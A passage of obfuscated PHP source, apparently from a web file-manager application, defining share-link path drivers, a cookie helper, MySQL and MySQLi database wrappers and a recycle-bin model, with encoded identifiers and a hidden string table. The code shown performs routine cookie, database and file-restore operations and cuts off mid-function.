$ÒÁ‡êóÎ[$„ª™—[95]] = Action($„ª™—[1257])->_shareItemeParse($ÒÁ‡êóÎ, $—¬ Ÿï°); } unset($ÒÁ‡êóÎ); return $Ã£‚œÉ; } public function getPathOuter($³àïƒğÄ) { $á¬¹åŒ =& $_SERVER[Á÷ ­Šë]; $ˆÛ•´ÛÅ = KodIO::parse($³àïƒğÄ); if ($ˆÛ•´ÛÅ[$á¬¹åŒ[29]] == KodIO::KOD_SHARE_ITEM) { return $ˆÛ•´ÛÅ[$á¬¹åŒ[86]]; } $¦µÌá¦ = KodIO::clear($³àïƒğÄ); $Ş®œŸŒ = KodIO::clear($this->pathParse[$á¬¹åŒ[490]][$á¬¹åŒ[1102]]); $°ö‘˜³è = substr($¦µÌá¦, strlen($Ş®œŸŒ)); if (substr($¦µÌá¦, 0, strlen($Ş®œŸŒ)) != $Ş®œŸŒ) { return !1; } return $this->pathParse[$á¬¹åŒ[1096]] . $á¬¹åŒ[8] . ltrim($°ö‘˜³è, $á¬¹åŒ[8]); } public function getType() { $Ô¼ §É =& $_SERVER[Á÷ ­Šë]; $§¸Ê†İ® = str_replace($Ô¼ §É[82], $Ô¼ §É[33], get_class($this)); return strtolower($§¸Ê†İ®); } public function isTypeObject($Æ¸°·ÏÉ) { return IO::isTypeObject($Æ¸°·ÏÉ); } public function info($™ÈİÃÂ) { return $this->infoParse($™ÈİÃÂ); } public function infoAuth($ñ¯Òˆ‚) { return $this->infoParse($ñ¯Òˆ‚); } public function infoWithChildren($İÌ¶ ) { return $this->infoParse($İÌ¶ , !0); } public function infoFull($Á¹–İÃØ) { return $this->infoParse($Á¹–İÃØ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($äŒ½†¹¶) { $this->pathParse = $äŒ½†¹¶; } protected function infoParse($Ø¿ÆËì, $äé’Ëú = false) { $úíÛóÛ =& $_SERVER[Á÷ ­Šë]; return Action($úíÛóÛ[1101])->sharePathInfo($this->pathParse[$úíÛóÛ[86]], !0, $äé’Ëú); } public function listPath($‰¡õ‚Ô, $†áÏÓà = false) { $ìÓÑÒ¥ =& $_SERVER[Á÷ ­Šë]; $×ÇÄÎø£ = IO::listPath($‰¡õ‚Ô, $†áÏÓà); if (!$×ÇÄÎø£) { return $×ÇÄÎø£; } if (is_array($×ÇÄÎø£[$ìÓÑÒ¥[1258]])) { $‡Š“ÒëÉ = Action($ìÓÑÒ¥[1267])->parsePathChildren($×ÇÄÎø£[$ìÓÑÒ¥[1258]], array($ìÓÑÒ¥[426] => $‰¡õ‚Ô)); $×ÇÄÎø£[$ìÓÑÒ¥[1258]] = Action($ìÓÑÒ¥[1101])->shareItemInfo($‡Š“ÒëÉ); } foreach ($×ÇÄÎø£ as $İ†ùÛ™€ => $ğ«‹ƒ‰) { if (!in_array($İ†ùÛ™€, array($ìÓÑÒ¥[84], $ìÓÑÒ¥[85]))) { continue; } foreach ($ğ«‹ƒ‰ as $”—ğÚ—˜ => $‡Š“ÒëÉ) { $‡Š“ÒëÉ = Action($ìÓÑÒ¥[1267])->parsePathChildren($‡Š“ÒëÉ, array($ìÓÑÒ¥[426] => $‰¡õ‚Ô)); $×ÇÄÎø£[$İ†ùÛ™€][$”—ğÚ—˜] = Action($ìÓÑÒ¥[1101])->shareItemInfo($‡Š“ÒëÉ); } } return $×ÇÄÎø£; } public function listAll($ï¢âæé) { $ ‰˜¶éç =& $_SERVER[Á÷ ­Šë]; $·Ï©»ñ– = IO::listAll($ï¢âæé); foreach ($·Ï©»ñ– as &$ËÖšºâô) { $§ü‚Ûê€ = IO::info($ËÖšºâô[$ ‰˜¶éç[86]]); $§ü‚Ûê€ = is_array($§ü‚Ûê€) ? $§ü‚Ûê€ : array(); $ËÖšºâô = array_merge($§ü‚Ûê€, $ËÖšºâô); $ËÖšºâô[$ ‰˜¶éç[95]] = Action($ ‰˜¶éç[1101])->shareItemInfo($ËÖšºâô); } unset($ËÖšºâô); return $·Ï©»ñ–; } } goto A­…àÄµßÔ; B‹µßÒ³‹: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($†•èïõ« = '', $ŞÂ§¼îú = 0) { if (is_string($†•èïõ«) && $†•èïõ« != $_SERVER[Á÷ ­Šë][33]) { $this->prefix = $†•èïõ«; } if (is_numeric($ŞÂ§¼îú) && $ŞÂ§¼îú > 0) { $this->expire = $ŞÂ§¼îú; } } public static function getInstance() { static $Í»Ô’ú£; if ($Í»Ô’ú£ === null) { $Í»Ô’ú£ = new self(); } return $Í»Ô’ú£; } private static $cookieDisable = false; public static function disable($åŠŠöíî) { self::$cookieDisable = $åŠŠöíî; } private static $sameCookieSet = array(); public static function set($İÃĞï³¾, $éğüĞº, $ïÂ¿ÁÔÈ = 0, $ì¥°§‰æ = false, $îÆëÍá‰ = false) { $‘•æ³ˆ =& $_SERVER[Á÷ ­Šë]; if (self::$cookieDisable) { return; } if (!$ïÂ¿ÁÔÈ) { $ïÂ¿ÁÔÈ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$İÃĞï³¾]) && self::$sameCookieSet[$İÃĞï³¾] == $éğüĞº . $ïÂ¿ÁÔÈ) { return; } self::$sameCookieSet[$İÃĞï³¾] = $éğüĞº . $ïÂ¿ÁÔÈ; if (!$îÆëÍá‰) { $îÆëÍá‰ = str_replace(HOST, $‘•æ³ˆ[33], APP_HOST); $îÆëÍá‰ = _get($GLOBALS, $‘•æ³ˆ[879], $îÆëÍá‰); } $°‚²ö– = $‘•æ³ˆ[33]; setcookie($İÃĞï³¾, $éğüĞº, time() + $ïÂ¿ÁÔÈ, $‘•æ³ˆ[8] . trim($îÆëÍá‰, $‘•æ³ˆ[8]) . $°‚²ö–, !1, !1, $ì¥°§‰æ); } public static function setSafe($ŠíÜÊÂ, $á½²É½ï, $à—Òæ¼ = 0) { self::set($ŠíÜÊÂ, $á½²É½ï, $à—Òæ¼, !0); } public static function get($Î¼½¹¸Š) { return isset($_COOKIE[$Î¼½¹¸Š]) ? $_COOKIE[$Î¼½¹¸Š] : !1; } public static function remove($›†ñÖ¦€, $òÂï¹”š = false) { unset($_COOKIE[$›†ñÖ¦€]); self::set($›†ñÖ¦€, $_SERVER[Á÷ ­Šë][33], 1, $òÂï¹”š); } } class DbMysql extends Db { public function __construct($îÕÅìú€ = '') { $Ğ“×Ö³ê =& $_SERVER[Á÷ ­Šë]; if (!extension_loaded($Ğ“×Ö³ê[796])) { think_exception(think_lang($Ğ“×Ö³ê[10]) . $Ğ“×Ö³ê[880]); } if (!empty($îÕÅìú€)) { $this->config = $îÕÅìú€; if (empty($this->config[$Ğ“×Ö³ê[13]])) { $this->config[$Ğ“×Ö³ê[13]] = $Ğ“×Ö³ê[33]; } } } public function connect($˜Ù±Ÿı¥ = '', $ñØº•êØ = 0, $×öÄÁúÁ = false) { $‘âê›ê =& $_SERVER[Á÷ ­Šë]; if (!isset($this->linkID[$ñØº•êØ])) { if (empty($˜Ù±Ÿı¥)) { $˜Ù±Ÿı¥ = $this->config; } $šÉéøµ = $˜Ù±Ÿı¥[$‘âê›ê[881]] . ($˜Ù±Ÿı¥[$‘âê›ê[882]] ? "\72{$˜Ù±Ÿı¥[$‘âê›ê[882]]}" : $‘âê›ê[33]); $Ç±Ûƒ–Î = !empty($˜Ù±Ÿı¥[$‘âê›ê[13]][$‘âê›ê[14]]) ? $˜Ù±Ÿı¥[$‘âê›ê[13]][$‘âê›ê[14]] : $this->pconnect; if ($Ç±Ûƒ–Î) { $this->linkID[$ñØº•êØ] = mysql_pconnect($šÉéøµ, $˜Ù±Ÿı¥[$‘âê›ê[883]], $˜Ù±Ÿı¥[$‘âê›ê[884]], 131072); } else { $this->linkID[$ñØº•êØ] = mysql_connect($šÉéøµ, $˜Ù±Ÿı¥[$‘âê›ê[883]], $˜Ù±Ÿı¥[$‘âê›ê[884]], !0, 131072); } if (!$this->linkID[$ñØº•êØ] || !empty($˜Ù±Ÿı¥[$‘âê›ê[17]]) && !mysql_select_db($˜Ù±Ÿı¥[$‘âê›ê[17]], $this->linkID[$ñØº•êØ])) { think_exception(mysql_error()); } $Àş¦ÁùÂ = mysql_get_server_info($this->linkID[$ñØº•êØ]); mysql_query($‘âê›ê[885] . think_config($‘âê›ê[886]) . $‘âê›ê[55], $this->linkID[$ñØº•êØ]); if ($Àş¦ÁùÂ > $‘âê›ê[887]) { mysql_query($‘âê›ê[888], $this->linkID[$ñØº•êØ]); } $this->connected = !0; if (1 != think_config($‘âê›ê[18])) { unset($this->config); } } return $this->linkID[$ñØº•êØ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($‘¨Â¢­¶) { $±¢ÕÏË =& $_SERVER[Á÷ ­Šë]; if (0 === stripos($‘¨Â¢­¶, $±¢ÕÏË[271])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‘¨Â¢­¶; if ($this->queryID) { $this->free(); } think_action_status($±¢ÕÏË[19], 1); think_status($±¢ÕÏË[20]); $this->queryID = mysql_query($‘¨Â¢­¶, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($÷ÔÜœİÆ) { $€“÷ß =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $÷ÔÜœİÆ; if ($this->queryID) { $this->free(); } think_action_status($€“÷ß[21], 1); think_status($€“÷ß[20]); $ÓåÂ¯éö = mysql_query($÷ÔÜœİÆ, $this->_linkID); $this->debug(); if (!1 === $ÓåÂ¯éö) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Á÷ ­Šë][889], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŞÂèòÙ… = mysql_query($_SERVER[Á÷ ­Šë][890], $this->_linkID); $this->transTimes = 0; if (!$ŞÂèòÙ…) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $üô–öñİ = mysql_query($_SERVER[Á÷ ­Šë][891], $this->_linkID); $this->transTimes = 0; if (!$üô–öñİ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÖÖ¡Ã°ñ = array(); if ($this->numRows > 0) { while ($ãêŠÎ±¾ = mysql_fetch_assoc($this->queryID)) { $ÖÖ¡Ã°ñ[] = $ãêŠÎ±¾; } mysql_data_seek($this->queryID, 0); } return $ÖÖ¡Ã°ñ; } public function getFields($ø¾şÑ¾) { $„á´‡„³ =& $_SERVER[Á÷ ­Šë]; $À…íĞŒ· = $this->query($„á´‡„³[892] . $this->parseKey($ø¾şÑ¾)); $£–Ë¹’õ = array(); if ($À…íĞŒ·) { foreach ($À…íĞŒ· as $ŞêÚÅÒ¡ => $™è£½”Ç) { $£–Ë¹’õ[$™è£½”Ç[$„á´‡„³[27]]] = array($„á´‡„³[28] => $™è£½”Ç[$„á´‡„³[27]], $„á´‡„³[29] => $™è£½”Ç[$„á´‡„³[30]], $„á´‡„³[31] => (bool) (strtoupper($™è£½”Ç[$„á´‡„³[32]]) === $„á´‡„³[893]), $„á´‡„³[34] => $™è£½”Ç[$„á´‡„³[35]], $„á´‡„³[36] => strtolower($™è£½”Ç[$„á´‡„³[37]]) == $„á´‡„³[38], $„á´‡„³[39] => strtolower($™è£½”Ç[$„á´‡„³[40]]) == $„á´‡„³[41]); } } return $£–Ë¹’õ; } public function getTables($¦ö¢§¢” = '') { $Ô¤”ñ™ =& $_SERVER[Á÷ ­Šë]; if (!empty($¦ö¢§¢”)) { $Ç—ÜÙâ = $Ô¤”ñ™[894] . $¦ö¢§¢” . $Ô¤”ñ™[895]; } else { $Ç—ÜÙâ = $Ô¤”ñ™[896]; } $››ŸÒ°º = $this->query($Ç—ÜÙâ); $¯ê´õì = array(); foreach ($››ŸÒ°º as $©ÖæÇûš => $ÖÊ……æğ) { $¯ê´õì[$©ÖæÇûš] = current($ÖÊ……æğ); } return $¯ê´õì; } public function replace($ş…¦Ñß—, $ÙÀÄæ±‹ = array()) { $åÏäğèÏ =& $_SERVER[Á÷ ­Šë]; foreach ($ş…¦Ñß— as $ĞÎ€ó§í => $×İ™‹õª) { $ÌàˆşÊ = $this->parseValue($×İ™‹õª); if (is_scalar($ÌàˆşÊ)) { $ÒĞËã¹ì[] = $ÌàˆşÊ; $‘áü²õ«[] = $this->parseKey($ĞÎ€ó§í); } } $À‰¼Ÿ¥Ö = $åÏäğèÏ[897] . $this->parseTable($ÙÀÄæ±‹[$åÏäğèÏ[286]]) . $åÏäğèÏ[898] . implode($åÏäğèÏ[47], $‘áü²õ«) . $åÏäğèÏ[899] . implode($åÏäğèÏ[47], $ÒĞËã¹ì) . $åÏäğèÏ[900]; return $this->execute($À‰¼Ÿ¥Ö); } public function insertAll($›£äÏ¹¦, $´Ì¿¯É© = array(), $×Ã¤‚˜À = false) { $—øüµğ =& $_SERVER[Á÷ ­Šë]; if (!is_array($›£äÏ¹¦[0])) { return !1; } $‘…éş¦¥ = array_keys($›£äÏ¹¦[0]); $ßåœ‡¦î = array(); foreach ($›£äÏ¹¦ as $¬¢ì¯¹ü) { $ÀÈÄ¼ô– = array(); foreach ($¬¢ì¯¹ü as $ã™Íƒ» => $ËÖ³°¤) { $ËÖ³°¤ = $this->parseValue($ËÖ³°¤); if (is_scalar($ËÖ³°¤)) { $ÀÈÄ¼ô–[] = $ËÖ³°¤; } } $ßåœ‡¦î[] = $—øüµğ[267] . implode($—øüµğ[47], $ÀÈÄ¼ô–) . $—øüµğ[900]; } array_walk($‘…éş¦¥, array($this, $—øüµğ[901])); $¢Øòã·Á = ($×Ã¤‚˜À ? $—øüµğ[902] : $—øüµğ[903]) . $—øüµğ[904] . $this->parseTable($´Ì¿¯É©[$—øüµğ[286]]) . $—øüµğ[898] . implode($—øüµğ[47], $‘…éş¦¥) . $—øüµğ[905] . implode($—øüµğ[47], $ßåœ‡¦î); return $this->execute($¢Øòã·Á); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¢„ÃÌş¿ =& $_SERVER[Á÷ ­Šë]; $this->error = mysql_errno() . $¢„ÃÌş¿[4] . mysql_error($this->_linkID); if ($¢„ÃÌş¿[33] != $this->queryStr) { $this->error .= LNG($¢„ÃÌş¿[45]) . $this->queryStr; } think_trace($this->error, $¢„ÃÌş¿[33], $¢„ÃÌş¿[46]); return $this->error; } public function escapeString($š¿–™¥Í) { if ($this->_linkID) { return mysql_real_escape_string($š¿–™¥Í, $this->_linkID); } else { return mysql_escape_string($š¿–™¥Í); } } public function parseKey(&$°«ÂÚ©ó, $êˆÖßêÈ = true) { $¹È²­˜ =& $_SERVER[Á÷ ­Šë]; if ($êˆÖßêÈ) { $°«ÂÚ©ó = $this->parseKeyCheck($°«ÂÚ©ó); } if ($°«ÂÚ©ó != $¹È²­˜[192] && !preg_match($¹È²­˜[906], $°«ÂÚ©ó)) { $°«ÂÚ©ó = $¹È²­˜[392] . trim($°«ÂÚ©ó, $¹È²­˜[392]) . $¹È²­˜[392]; } return $°«ÂÚ©ó; } } class DbMysqli extends Db { public function __construct($›úéÂœ = '') { $—ñğ˜È¾ =& $_SERVER[Á÷ ­Šë]; if (!extension_loaded($—ñğ˜È¾[795])) { think_exception(think_lang($—ñğ˜È¾[10]) . $—ñğ˜È¾[907]); } if (!empty($›úéÂœ)) { $this->config = $›úéÂœ; if (empty($this->config[$—ñğ˜È¾[13]])) { $this->config[$—ñğ˜È¾[13]] = $—ñğ˜È¾[33]; } } } public function connect($—ãâ‰ç = '', $× Ë¦íµ = 0) { $ë¥«Çº¡ =& $_SERVER[Á÷ ­Šë]; if (!isset($this->linkID[$× Ë¦íµ])) { if (empty($—ãâ‰ç)) { $—ãâ‰ç = $this->config; } $this->linkID[$× Ë¦íµ] = new mysqli($—ãâ‰ç[$ë¥«Çº¡[881]], $—ãâ‰ç[$ë¥«Çº¡[883]], $—ãâ‰ç[$ë¥«Çº¡[884]], $—ãâ‰ç[$ë¥«Çº¡[17]], $—ãâ‰ç[$ë¥«Çº¡[882]] ? intval($—ãâ‰ç[$ë¥«Çº¡[882]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ï¥£º˜æ = $this->linkID[$× Ë¦íµ]->server_version; $this->linkID[$× Ë¦íµ]->query($ë¥«Çº¡[885] . think_config($ë¥«Çº¡[886]) . $ë¥«Çº¡[55]); if ($ï¥£º˜æ > $ë¥«Çº¡[887]) { $this->linkID[$× Ë¦íµ]->query($ë¥«Çº¡[888]); } $this->connected = !0; if (1 != think_config($ë¥«Çº¡[18])) { unset($this->config); } } return $this->linkID[$× Ë¦íµ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($“•»Êø) { $••÷¼ª =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $“•»Êø; if ($this->queryID) { $this->free(); } think_action_status($••÷¼ª[19], 1); think_status($••÷¼ª[20]); $this->queryID = $this->_linkID->query($“•»Êø); if ($this->_linkID->more_results()) { while (($Ç‘íÕŸ» = $this->_linkID->next_result()) != NULL) { $Ç‘íÕŸ»->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($©ŠÊÑ¯ğ) { $µ£è£ÆÈ =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©ŠÊÑ¯ğ; if ($this->queryID) { $this->free(); } think_action_status($µ£è£ÆÈ[21], 1); think_status($µ£è£ÆÈ[20]); $òòÅùº = $this->_linkID->query($©ŠÊÑ¯ğ); $this->debug(); if (!1 === $òòÅùº) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¬İ—ŠŞÙ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¬İ—ŠŞÙ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‹‰„‡Ÿ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‹‰„‡Ÿ) { $this->error(); return !1; } } return !0; } private function getAll() { $–Ù¸¥ø½ = array(); if ($this->numRows > 0) { for ($¹ÜçµÑ = 0; $¹ÜçµÑ < $this->numRows; $¹ÜçµÑ++) { $–Ù¸¥ø½[$¹ÜçµÑ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $–Ù¸¥ø½; } public function getFields($¬˜«µŒ) { $‹…ô¶ =& $_SERVER[Á÷ ­Šë]; $‰ØÆÎ“Õ = $this->query($‹…ô¶[892] . $this->parseKey($¬˜«µŒ)); $ÈÒ©¦Ù¿ = array(); if ($‰ØÆÎ“Õ) { foreach ($‰ØÆÎ“Õ as $Şø¾‡ıÅ => $“¥úŞƒ¾) { $ÈÒ©¦Ù¿[$“¥úŞƒ¾[$‹…ô¶[27]]] = array($‹…ô¶[28] => $“¥úŞƒ¾[$‹…ô¶[27]], $‹…ô¶[29] => $“¥úŞƒ¾[$‹…ô¶[30]], $‹…ô¶[31] => (bool) ($“¥úŞƒ¾[$‹…ô¶[32]] === $‹…ô¶[33]), $‹…ô¶[34] => $“¥úŞƒ¾[$‹…ô¶[35]], $‹…ô¶[36] => strtolower($“¥úŞƒ¾[$‹…ô¶[37]]) == $‹…ô¶[38], $‹…ô¶[39] => strtolower($“¥úŞƒ¾[$‹…ô¶[40]]) == $‹…ô¶[41]); } } return $ÈÒ©¦Ù¿; } public function getTables($µê³€Ù = '') { $îï”•©ë =& $_SERVER[Á÷ ­Šë]; $§ƒâÂÔª = !empty($µê³€Ù) ? $îï”•©ë[894] . $µê³€Ù . $îï”•©ë[895] : $îï”•©ë[896]; $Æıä°å = $this->query($§ƒâÂÔª); $Äã†¶ú‡ = array(); if ($Æıä°å) { foreach ($Æıä°å as $º ’ºÄ» => $¹ƒÔ±) { $Äã†¶ú‡[$º ’ºÄ»] = current($¹ƒÔ±); } } return $Äã†¶ú‡; } public function replace($ˆ–ÃÓ”™, $àğ¼³”› = array()) { $¯Åßş¶Ù =& $_SERVER[Á÷ ­Šë]; foreach ($ˆ–ÃÓ”™ as $ºËÕß½¦ => $«á€Û°¬) { $¤®À²ñæ = $this->parseValue($«á€Û°¬); if (is_scalar($¤®À²ñæ)) { $–õÈ“æ[] = $¤®À²ñæ; $ˆÒĞª[] = $this->parseKey($ºËÕß½¦); } } $Şœ–’Â = $¯Åßş¶Ù[897] . $this->parseTable($àğ¼³”›[$¯Åßş¶Ù[286]]) . $¯Åßş¶Ù[898] . implode($¯Åßş¶Ù[47], $ˆÒĞª) . $¯Åßş¶Ù[899] . implode($¯Åßş¶Ù[47], $–õÈ“æ) . $¯Åßş¶Ù[900]; return $this->execute($Şœ–’Â); } public function insertAll($¹ºïøÊ›, $ì±ÃåõŒ = array(), $…ÁÈóÒŠ = false) { $˜ÏüÂ =& $_SERVER[Á÷ ­Šë]; if (!is_array($¹ºïøÊ›[0])) { return !1; } $ÙŞèèàÉ = array_keys($¹ºïøÊ›[0]); $¤ßĞ˜ = array(); foreach ($¹ºïøÊ› as $âİ‘×‚) { $ÑöËßÊ¢ = array(); foreach ($âİ‘×‚ as $ğù¿¢— => $¬³æôÛˆ) { $¬³æôÛˆ = $this->parseValue($¬³æôÛˆ); if (is_scalar($¬³æôÛˆ)) { $ÑöËßÊ¢[] = $¬³æôÛˆ; } } $¤ßĞ˜[] = $˜ÏüÂ[267] . implode($˜ÏüÂ[47], $ÑöËßÊ¢) . $˜ÏüÂ[900]; } array_walk($ÙŞèèàÉ, array($this, $˜ÏüÂ[901])); $’Òêˆø“ = $…ÁÈóÒŠ ? $˜ÏüÂ[902] : $˜ÏüÂ[903]; $ê¬ĞÒè¨ = $’Òêˆø“ . $˜ÏüÂ[904] . $this->parseTable($ì±ÃåõŒ[$˜ÏüÂ[286]]) . $˜ÏüÂ[898] . implode($˜ÏüÂ[47], $ÙŞèèàÉ) . $˜ÏüÂ[905] . implode($˜ÏüÂ[47], $¤ßĞ˜); return $this->execute($ê¬ĞÒè¨); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Íµñßòí =& $_SERVER[Á÷ ­Šë]; $this->error = $this->_linkID->errno . $Íµñßòí[4] . $this->_linkID->error; if ($Íµñßòí[33] != $this->queryStr) { $this->error .= LNG($Íµñßòí[45]) . $this->queryStr; } think_trace($this->error, $Íµñßòí[33], $Íµñßòí[46]); return $this->error; } public function escapeString($·óö“ø¥) { if ($this->_linkID) { return $this->_linkID->real_escape_string($·óö“ø¥); } else { return addslashes($·óö“ø¥); } } public function parseKey(&$“ÌÆ†—, $ÁÊñŸó = true) { $Ø÷—šî€ =& $_SERVER[Á÷ ­Šë]; if ($ÁÊñŸó) { $“ÌÆ†— = $this->parseKeyCheck($“ÌÆ†—); } if ($“ÌÆ†— != $Ø÷—šî€[192] && !preg_match($Ø÷—šî€[906], $“ÌÆ†—)) { $“ÌÆ†— = $Ø÷—šî€[392] . trim($“ÌÆ†—, $Ø÷—šî€[392]) . $Ø÷—šî€[392]; } return $“ÌÆ†—; } } goto bÇñÚ¬·; Bµé™ğÔ¥—: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\x63\145\137\162\x65\143\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\x54\x69\155\145", "\164\x69\x6d\145", "\151\156\163\x65\x72\x74", "\146\x75\156\x63\x74\151\x6f\x6e")); public function listData($Ù”É°Ç = false) { $ÌÉ£â¥ =& $_SERVER[Á÷ ­Šë]; $Ù”É°Ç = $Ù”É°Ç ? $Ù”É°Ç : USER_ID; $ÃÖÎğ¢Õ = $this->where(array($ÌÉ£â¥[1565] => $Ù”É°Ç))->select(); return array_to_keyvalue($ÃÖÎğ¢Õ, $ÌÉ£â¥[33], $ÌÉ£â¥[407]); } public function moveToRecycle($óÀÙ„³‹) { $Ğ¸°ÍÍ³ =& $_SERVER[Á÷ ­Šë]; $³‡ßòû† = Model($Ğ¸°ÍÍ³[1249]); $ğ°¬Ú» = $³‡ßòû†->sourceInfo($óÀÙ„³‹); if (!$ğ°¬Ú» || $ğ°¬Ú»[$Ğ¸°ÍÍ³[435]] == $Ğ¸°ÍÍ³[97]) { return; } $ÉÅÉ¦–é = array($Ğ¸°ÍÍ³[422] => $óÀÙ„³‹, $Ğ¸°ÍÍ³[1565] => USER_ID, $Ğ¸°ÍÍ³[584] => $ğ°¬Ú»[$Ğ¸°ÍÍ³[416]], $Ğ¸°ÍÍ³[585] => $ğ°¬Ú»[$Ğ¸°ÍÍ³[508]], $Ğ¸°ÍÍ³[588] => $ğ°¬Ú»[$Ğ¸°ÍÍ³[525]]); $this->add($ÉÅÉ¦–é); $this->recycleMove($óÀÙ„³‹, 1); if ($ğ°¬Ú»[$Ğ¸°ÍÍ³[415]] == $Ğ¸°ÍÍ³[97]) { $Šâ¸ÌŸ = array($Ğ¸°ÍÍ³[588] => array($Ğ¸°ÍÍ³[548], $ğ°¬Ú»[$Ğ¸°ÍÍ³[525]] . $óÀÙ„³‹ . $Ğ¸°ÍÍ³[549])); $³‡ßòû†->where($Šâ¸ÌŸ)->setField($Ğ¸°ÍÍ³[435], 1); } } public function clear() { $this->remove(!1); } public function remove($ïçµƒÃ = false, $Şˆ˜Ú¨ = false) { $­×şïŠ =& $_SERVER[Á÷ ­Šë]; $Şˆ˜Ú¨ = $Şˆ˜Ú¨ ? $Şˆ˜Ú¨ : USER_ID; $“Ò¿…«ø = Model($­×şïŠ[1249]); $‚¹Ñõêî = $this->listData($Şˆ˜Ú¨); $ïçµƒÃ = $ïçµƒÃ === !1 ? !1 : $ïçµƒÃ; $«¼Šôµä = array(); foreach ($‚¹Ñõêî as $ëÇö·‡¹) { if ($ïçµƒÃ != !1 && !in_array($ëÇö·‡¹, $ïçµƒÃ)) { continue; } $¤˜ÊƒÕ = $“Ò¿…«ø->sourceInfo($ëÇö·‡¹); $“Ò¿…«ø->remove($ëÇö·‡¹, !1); $’ƒÑ­šÏ = $¤˜ÊƒÕ[$­×şïŠ[416]] . $­×şïŠ[81] . $¤˜ÊƒÕ[$­×şïŠ[508]]; $«¼Šôµä[$’ƒÑ­šÏ] = array($­×şïŠ[584] => $¤˜ÊƒÕ[$­×şïŠ[416]], $­×şïŠ[508] => $¤˜ÊƒÕ[$­×şïŠ[508]]); $this->where(array($­×şïŠ[407] => $ëÇö·‡¹))->delete(); } foreach ($«¼Šôµä as $å›ù­¶) { $“Ò¿…«ø->targetSpaceUpdate($å›ù­¶[$­×şïŠ[416]], $å›ù­¶[$­×şïŠ[508]]); } } public function restore($ÆÏıö¥¾ = false) { $°ú¹¨ = $this->listData(); $this->_restoreSource($°ú¹¨, $ÆÏıö¥¾); } public function removeUserAll($ÊœÊ¨¢è) { $this->remove(!1, $ÊœÊ¨¢è); } private function _restoreSource($´²¨§§, $²¿¶òÌ‘) { $ûî¼ïá‚ =& $_SERVER[Á÷ ­Šë]; $ˆ§Ø ¨– = Model($ûî¼ïá‚[1249]); $²¿¶òÌ‘ = $²¿¶òÌ‘ == !1 ? !1 : $²¿¶òÌ‘; if (!$´²¨§§) { return !0; } $•õò¯À = array(); foreach ($´²¨§§ as $‹ò‹Î«Š) { if ($²¿¶òÌ‘ != !1 && !in_array($‹ò‹Î«Š, $²¿¶òÌ‘)) { continue; } $İîÏ§¹ = $ˆ§Ø ¨–->sourceInfo($‹ò‹Î«Š); $ÜÌş¶íí = $ˆ§Ø ¨–->sourceInfo($İîÏ§¹[$ûî¼ïá‚[502]]); if ($ÜÌş¶íí[$ûî¼ïá‚[435]] == $ûî¼ïá‚[97]) { continue; } $ˆ§Ø ¨–->lockMoveStart($‹ò‹Î«Š); $this->recycleMove($‹ò‹Î«Š, 0); if ($İîÏ§¹[$ûî¼ïá‚[415]] == $ûî¼ïá‚[97]) { $Şê¤ó° = array($ûî¼ïá‚[588] => array($ûî¼ïá‚[548], $İîÏ§¹[$ûî¼ïá‚[525]] . $‹ò‹Î«Š . $ûî¼ïá‚[549])); $ˆ§Ø ¨–->where($Şê¤ó°)->setField($ûî¼ïá‚[435], 0); $this->restoreFolderChildren($‹ò‹Î«Š, $´²¨§§); } $this->where(array($ûî¼ïá‚[407] => $‹ò‹Î«Š))->delete(); $ˆ§Ø ¨–->folderSizeReset($İîÏ§¹[$ûî¼ïá‚[502]]); $•õò¯À[] = $İîÏ§¹[$ûî¼ïá‚[502]]; if ($İîÏ§¹[$ûî¼ïá‚[415]] == $ûî¼ïá‚[97]) { $•õò¯À[] = $‹ò‹Î«Š; } $ˆ§Ø ¨–->lockMoveEnd($‹ò‹Î«Š); } $ˆ§Ø ¨–->updateModifyTime($•õò¯À); } private function restoreFolderChildren($é¨¹”ª, $Ùë¡ÈÃé) { $Ù¸†Â— =& $_SERVER[Á÷ ­Šë]; $œ©äş§ò = Model($Ù¸†Â—[1249]); $Í£õİ‚ä = array($Ù¸†Â—[407] => array($Ù¸†Â—[7], array())); foreach ($Ùë¡ÈÃé as $ŒüÉ±™ƒ) { if ($ŒüÉ±™ƒ == $é¨¹”ª) { continue; } if 